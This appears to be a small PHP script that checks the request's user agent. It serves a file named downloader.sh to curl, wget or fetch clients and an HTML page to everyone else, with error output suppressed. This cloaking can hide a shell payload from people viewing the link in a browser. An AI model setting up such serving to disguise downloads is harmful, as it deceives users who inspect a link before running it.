<?php
ini_set('display_errors', 0);
error_reporting(0);

$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

if (preg_match('/curl|wget|fetch/', $userAgent)) {
    header('Content-Type: text/plain');
    echo file_get_contents('downloader.sh');
} else {
    header('Content-Type: text/html');
    echo file_get_contents('content.html');
}
?>